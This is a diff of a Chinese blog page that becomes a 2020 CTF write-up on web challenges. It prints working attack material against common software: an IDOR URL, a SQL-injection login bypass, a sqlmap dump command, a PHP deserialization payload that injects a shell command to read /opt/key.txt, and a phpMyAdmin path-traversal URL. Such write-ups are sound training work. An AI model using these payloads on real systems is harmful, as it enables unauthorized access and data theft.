@@ -6,15 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>Blog</title>
+  <title>合天杯2020 | Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog">
-<meta property="og:url" content="https://yd0ng.github.io/page/4/index.html">
+  <meta name="description" content="合天杯2020WP题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="合天杯2020">
+<meta property="og:url" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/index.html">
 <meta property="og:site_name" content="Blog">
+<meta property="og:description" content="合天杯2020WP题解">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/1.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/2.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/3.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/4.1.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/4.2.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/5.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/6.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/7.png">
+<meta property="article:published_time" content="2020-02-29T12:35:45.000Z">
+<meta property="article:modified_time" content="2020-02-29T12:45:10.871Z">
 <meta property="article:author" content="yd0ng">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/1.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -130,37 +144,98 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Flag-for-2020" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-合天杯2020" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/01/Flag-for-2020/">Flag-for-2020</a>
+    <h1 class="article-title" itemprop="name">
+      合天杯2020
     </h1>
   
 
         
-        <a href="/2020/01/01/Flag-for-2020/" class="archive-article-date">
-  	<time datetime="2019-12-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
+        <a href="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/" class="archive-article-date">
+  	<time datetime="2020-02-29T12:35:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="记录一下2020年的flag，以此自勉"><a href="#记录一下2020年的flag，以此自勉" class="headerlink" title="记录一下2020年的flag，以此自勉"></a>记录一下2020年的flag，以此自勉</h1><p>接受自我，做真实的自己，“人生如逆途，我亦是行人”。</p>
-        
-          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/#more">more >></a>
-        
+        <p>合天杯2020WP题解</p>
+<a id="more"></a>
+
+<h1 id="听说越权就送flag"><a href="#听说越权就送flag" class="headerlink" title="听说越权就送flag"></a>听说越权就送flag</h1><p>TinyShop越权漏洞，越权链接如下：</p>
+<p>?con=simple&amp;act=address_other&amp;id=1</p>
+<p>Id=8有个假flag（我真是交了半天）</p>
+<p>最后flag在id=71</p>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/1.png" alt></p>
+<h1 id="你的脑袋有点大呦"><a href="#你的脑袋有点大呦" class="headerlink" title="你的脑袋有点大呦"></a>你的脑袋有点大呦</h1><p>抓包，flag在http的响应头处</p>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/2.png" alt></p>
+<h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>直接访问回403</p>
+<p>添加X-Forwarded-For: 127.0.0.1跳转到登陆界面</p>
+<p>万能密码admin’# 得到flag</p>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/3.png" alt></p>
+<h1 id="合天网安新闻"><a href="#合天网安新闻" class="headerlink" title="合天网安新闻"></a>合天网安新闻</h1><p>提示宽字节注入，注入点在?id=2</p>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/4.1.png" alt></p>
+<p>sqlmap一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#39;http:&#x2F;&#x2F;47.104.63.220:5002&#x2F;?id&#x3D;1&#39; --tamper unmagicquotes -D test -T flag -C flag –dump</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/4.2.png" alt></p>
+<h1 id="后台的key"><a href="#后台的key" class="headerlink" title="后台的key"></a>后台的key</h1><p>熊海cms后台逻辑漏洞</p>
+<p>直接访问admin/?r= adset</p>
+<p>然后cookie加个user=admin即可得到flag</p>
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/5.png" alt></p>
+<h1 id="统一登陆平台"><a href="#统一登陆平台" class="headerlink" title="统一登陆平台"></a>统一登陆平台</h1><p>源码泄露，发现<a href="http://www.tar.gz，代码审计发现反序列化在common/home.php" target="_blank" rel="noopener">www.tar.gz，代码审计发现反序列化在common/home.php</a><br>几乎在2018年上海web2一模一样，空格用${IFS}绕，flag在/opt/key.txt<br>这样构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class home&#123;</span><br><span class="line">    </span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        $this-&gt;method &#x3D; $method;</span><br><span class="line">        $this-&gt;args &#x3D; $args;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new home(&quot;ping&quot;,array(&#39;127.0.0.1;cat$&#123;IFS&#125;&#x2F;opt&#x2F;key.txt&#39;));</span><br><span class="line">$d&#x3D;serialize($a);</span><br><span class="line">echo urlencode($d);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/6.png" alt></p>
+<h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><p>参考<a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p>
+<p>给出payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/7.png" alt></p>
+<h1 id="御宅战疫"><a href="#御宅战疫" class="headerlink" title="御宅战疫"></a>御宅战疫</h1><p>微信公众号发个消息就给flag</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>没做出来，等复现</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>没做出来，等复现</p>
+
       
       
     
       <div class="declare" hidden="hidden"></div>
     
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢您的打赏，大家一起加油喔~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -171,7 +246,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -180,16 +255,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/02/29/%E5%90%88%E5%A4%A9%E6%9D%AF2020/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/28/%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">端口及常见服务记录</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -204,101 +338,43 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-2019年度总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">2019年度总结</a>
-    </h1>
-  
-
-        
-        <a href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2019-12-31T15:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        2019年终于过去，进入了大三也已经半年，今天结束了编译原理的期末考试，距离下一场计组还有六天的时间，停下来转眼看看这一年，并简单记录一下这一年的自我感受。
-        
-          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#听说越权就送flag"><span class="toc-number">1.</span> <span class="toc-text">听说越权就送flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你的脑袋有点大呦"><span class="toc-number">2.</span> <span class="toc-text">你的脑袋有点大呦</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后台登录"><span class="toc-number">3.</span> <span class="toc-text">后台登录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#合天网安新闻"><span class="toc-number">4.</span> <span class="toc-text">合天网安新闻</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后台的key"><span class="toc-number">5.</span> <span class="toc-text">后台的key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#统一登陆平台"><span class="toc-number">6.</span> <span class="toc-text">统一登陆平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpmyadmin"><span class="toc-number">7.</span> <span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#御宅战疫"><span class="toc-number">8.</span> <span class="toc-text">御宅战疫</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">9.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">10.</span> <span class="toc-text">SSRF</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
+  
+  
+  
+
+  
+
+  
+
+  
+
 <!--显示阅读次数-->
 
-
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
-  
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
 
 
           </div>
@@ -337,8 +413,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
